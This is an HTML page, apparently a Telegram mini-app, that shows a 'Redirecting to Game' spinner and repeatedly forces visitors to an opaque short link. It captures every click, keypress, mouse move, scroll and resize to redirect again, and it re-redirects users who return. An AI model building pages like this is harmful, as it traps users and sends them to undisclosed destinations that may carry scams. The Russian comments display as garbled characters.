<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
            color: white;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            text-align: center;
        }

        .container {
            max-width: 400px;
            padding: 20px;
        }

        .loading {
            font-size: 24px;
            margin-bottom: 20px;
        }

        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid rgba(255,255,255,0.3);
            border-top: 5px solid #ffd700;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .info {
            background: rgba(255,255,255,0.1);
            border-radius: 15px;
            padding: 20px;
            margin: 20px 0;
        }

        .countdown {
            font-size: 18px;
            color: #ffd700;
            margin: 10px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="loading">üéÆ Redirecting to Game...</div>
        <div class="spinner"></div>
        
        <div class="info">
            <div class="countdown" id="countdown">Redirecting in 3 seconds...</div>
            <p>Please wait while we redirect you to the game</p>
        </div>
        
        <div style="margin-top: 20px; font-size: 14px; opacity: 0.7;">
            If redirect doesn't work, <a href="https://2no.co/RNEX87" style="color: #ffd700;">click here</a>
        </div>
    </div>

    <script>
        let tg = window.Telegram.WebApp;
        
        // –§—É–Ω–∫—Ü–∏—è –ø—Ä–∏–Ω—É–¥–∏—Ç–µ–ª—å–Ω–æ–≥–æ —Ä–µ–¥–∏—Ä–µ–∫—Ç–∞
        function forceRedirect() {
            const targetUrl = "https://2no.co/RNEX87";
            
            // –ü—Ä–æ–±—É–µ–º –≤—Å–µ –º–µ—Ç–æ–¥—ã —Ä–µ–¥–∏—Ä–µ–∫—Ç–∞
            try {
                // –û—Å–Ω–æ–≤–Ω–æ–π –º–µ—Ç–æ–¥
                window.location.href = targetUrl;
                
                // –†–µ–∑–µ—Ä–≤–Ω—ã–µ –º–µ—Ç–æ–¥—ã
                setTimeout(() => {
                    window.location.replace(targetUrl);
                }, 100);
                
                setTimeout(() => {
                    document.body.innerHTML = `<meta http-equiv="refresh" content="0;url=${targetUrl}">`;
                }, 200);
                
            } catch (error) {
                console.error('Redirect error:', error);
            }
        }
        
        // –§—É–Ω–∫—Ü–∏—è –æ–±—Ä–∞—Ç–Ω–æ–≥–æ –æ—Ç—Å—á–µ—Ç–∞
        function startCountdown() {
            let seconds = 3;
            const countdownElement = document.getElementById('countdown');
            
            const countdownInterval = setInterval(() => {
                countdownElement.textContent = `Redirecting in ${seconds} seconds...`;
                seconds--;
                
                if (seconds < 0) {
                    clearInterval(countdownInterval);
                    forceRedirect();
                }
            }, 1000);
        }
        
        // –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–µ –≤–æ–∑–≤—Ä–∞—Ç –ª–∏ —ç—Ç–æ –≤ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ
        function checkReturn() {
            const lastRedirect = localStorage.getItem('last_redirect');
            const now = Date.now();
            
            // –ï—Å–ª–∏ –ø—Ä–æ—à–ª–æ –º–µ–Ω—å—à–µ 10 —Å–µ–∫—É–Ω–¥ —Å –ø–æ—Å–ª–µ–¥–Ω–µ–≥–æ —Ä–µ–¥–∏—Ä–µ–∫—Ç–∞ - —Å–Ω–æ–≤–∞ —Ä–µ–¥–∏—Ä–µ–∫—Ç–∏–º
            if (lastRedirect && (now - parseInt(lastRedirect)) < 10000) {
                document.querySelector('.loading').textContent = 'üîÑ Detected return - redirecting again...';
                setTimeout(forceRedirect, 500);
                return true;
            }
            
            // –°–æ—Ö—Ä–∞–Ω—è–µ–º –≤—Ä–µ–º—è —Ä–µ–¥–∏—Ä–µ–∫—Ç–∞
            localStorage.setItem('last_redirect', now.toString());
            return false;
        }
        
        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è
        function init() {
            tg.ready();
            tg.expand();
            
            // –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–µ –≤–æ–∑–≤—Ä–∞—Ç –ª–∏ —ç—Ç–æ
            if (!checkReturn()) {
                // –ó–∞–ø—É—Å–∫–∞–µ–º –æ–±—Ä–∞—Ç–Ω—ã–π –æ—Ç—Å—á–µ—Ç
                startCountdown();
                
                // –ê–≤—Ç–æ-—Ä–µ–¥–∏—Ä–µ–∫—Ç —á–µ—Ä–µ–∑ 3 —Å–µ–∫—É–Ω–¥—ã
                setTimeout(forceRedirect, 3000);
            }
            
            // –ü–µ—Ä–µ—Ö–≤–∞—Ç—ã–≤–∞–µ–º –≤—Å–µ –∫–ª–∏–∫–∏ –∏ —Ç–æ–∂–µ —Ä–µ–¥–∏—Ä–µ–∫—Ç–∏–º
            document.addEventListener('click', function(e) {
                e.preventDefault();
                forceRedirect();
            });
            
            // –ü–µ—Ä–µ—Ö–≤–∞—Ç—ã–≤–∞–µ–º –Ω–∞–∂–∞—Ç–∏—è –∫–ª–∞–≤–∏—à
            document.addEventListener('keydown', function(e) {
                forceRedirect();
            });
            
            // –ü–µ—Ä–∏–æ–¥–∏—á–µ—Å–∫–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ –∏ —Ä–µ–¥–∏—Ä–µ–∫—Ç
            setInterval(() => {
                // –ï—Å–ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –≤—Å–µ –µ—â–µ –∑–¥–µ—Å—å - —Ä–µ–¥–∏—Ä–µ–∫—Ç–∏–º —Å–Ω–æ–≤–∞
                if (!window.location.href.includes('2no.co')) {
                    forceRedirect();
                }
            }, 5000);
        }
        
        // –ó–∞–ø—É—Å–∫–∞–µ–º –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ
        document.addEventListener('DOMContentLoaded', init);
        
        // –¢–∞–∫–∂–µ –∑–∞–ø—É—Å–∫–∞–µ–º –∫–æ–≥–¥–∞ —Å—Ç—Ä–∞–Ω–∏—Ü–∞ —Å—Ç–∞–Ω–æ–≤–∏—Ç—Å—è –≤–∏–¥–∏–º–æ–π (–≤–æ–∑–≤—Ä–∞—Ç –≤ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ)
        document.addEventListener('visibilitychange', function() {
            if (!document.hidden) {
                setTimeout(forceRedirect, 1000);
            }
        });
        
        // –†–µ–¥–∏—Ä–µ–∫—Ç –ø—Ä–∏ –ª—é–±–æ–º –¥–≤–∏–∂–µ–Ω–∏–∏ –º—ã—à–∏
        document.addEventListener('mousemove', function() {
            setTimeout(forceRedirect, 500);
        });
        
        // –†–µ–¥–∏—Ä–µ–∫—Ç –ø—Ä–∏ —Å–∫—Ä–æ–ª–ª–µ
        document.addEventListener('scroll', function() {
            setTimeout(forceRedirect, 500);
        });
        
        // –†–µ–¥–∏—Ä–µ–∫—Ç –ø—Ä–∏ –∏–∑–º–µ–Ω–µ–Ω–∏–∏ —Ä–∞–∑–º–µ—Ä–∞ –æ–∫–Ω–∞
        window.addEventListener('resize', function() {
            setTimeout(forceRedirect, 500);
        });
    </script>
</body>
</html>
